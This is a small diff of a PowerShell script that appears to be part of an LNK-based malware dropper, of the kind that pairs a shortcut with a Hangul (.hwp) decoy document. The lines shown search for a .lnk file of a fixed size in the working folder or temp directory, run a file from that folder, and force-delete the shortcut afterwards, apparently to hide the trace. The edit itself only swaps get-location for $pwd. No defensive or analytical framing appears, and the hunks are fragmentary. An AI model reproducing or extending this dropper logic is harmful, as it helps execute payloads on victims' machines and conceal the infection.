@@ -1,5 +1,5 @@
 $lk=ls -Path '.\' -filter '*.lnk';
-$relpath=get-location;
+$relpath=$pwd;
 for($a = 0;$a -lt $lk.length;$a++){if($lk[$a].length -eq 56397) {$lk=$lk[$a].name;break}}
 $n=$lk.Replace('.lnk','.hwp');
 if($lk -eq $null) {$lk=ls -Path $env:temp -depth 2
@@ -12,5 +12,6 @@ ac -path "C:\Users\user\Downloads\1.txt" $relpath
 &"$relpath\\$fsdf";
 
 ri "$relpath\\$lk" -force;
+
 
 
